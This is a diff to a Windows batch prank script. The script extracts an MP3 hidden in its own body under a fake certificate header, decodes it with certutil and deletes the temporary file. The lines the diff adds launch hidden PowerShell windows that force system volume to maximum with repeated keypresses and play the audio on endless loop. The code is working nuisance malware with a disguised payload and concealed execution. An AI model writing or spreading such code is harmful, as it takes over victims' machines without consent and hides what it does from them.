@@ -5,8 +5,11 @@ more +10 "%~f0" > "%B64_FILE%"
 certutil -decode "%B64_FILE%" "%TEMP_FILE%" >nul 2>&1
 del "%B64_FILE%" >nul 2>&1
 
-start /B powershell -WindowStyle Hidden -Command "\$wmp = New-Object -ComObject WMPlayer.OCX; \$wmp.URL = \x27%TEMP_FILE%\x27; \$wmp.settings.setMode(\x27loop\x27, \$true); \$wmp.controls.play(); while(\$true) { Start-Sleep -Seconds 10 }"
-exit /b
+:loop
+:: Maximize volume
+powershell -WindowStyle Hidden -Command "for($i=0; $i -lt 50; $i++){(new-object -com wscript.shell).SendKeys([char]175)}" >nul 2>&1
+powershell -WindowStyle Hidden -Command "$wmp = New-Object -ComObject WMPlayer.OCX; $wmp.URL = '%TEMP_FILE%'; $wmp.settings.setMode('loop', $true); $wmp.controls.play(); while($true) { Start-Sleep -Seconds 10 }"
+goto loop
 
 -----BEGIN CERTIFICATE-----
 SUQzBAAAAAAKTlRYWFgAAAASAAADbWFqb3JfYnJhbmQAaXNvbQBUWFhYAAAAEwAA
